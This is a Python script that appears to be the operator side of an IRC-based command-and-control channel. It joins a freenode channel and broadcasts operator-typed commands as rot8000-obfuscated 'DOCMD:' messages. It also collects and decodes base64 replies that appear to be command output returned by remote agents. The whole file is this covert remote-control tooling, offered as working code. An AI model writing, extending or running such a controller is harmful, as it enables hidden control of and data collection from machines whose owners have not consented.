import base64
import threading
from collections import defaultdict

import muirc

HOST = 'chat.freenode.net'
PORT = 6665
NICK = 'servisek'
USERNAME = 'commandator'
CHANNEL = '#blablabla'

conn = muirc.Connection(("chat.freenode.net", 6667))
conn.nick(NICK)
conn.user(NICK, NICK, NICK, NICK)
conn.join(CHANNEL)

print("READY")


def handle_messages():
    user_messages = defaultdict(lambda: "")
    for msg in conn:
        if msg['command'] == 'PRIVMSG' and len(msg['params']) == 2 and msg['params'][0] == CHANNEL:
            data = msg['params'][1]
            user = msg['user'] or msg['nick']
            if data and data[0] == '>':
                user_messages[user] = ''
            msg = user_messages[user] + data if user in user_messages else data
            if msg[-1] == '.':  # end of data from user
                msg = muirc.rot8000(msg[1:-1])
                result = base64.b64decode(msg).decode("UTF-8")
                print(result)
                msg = ''
            user_messages[user] = msg


t = threading.Thread(target=handle_messages, args=())
t.start()

while True:
    cmd = input(">")
    conn.privmsg(CHANNEL, muirc.rot8000(f'DOCMD:{cmd}'))
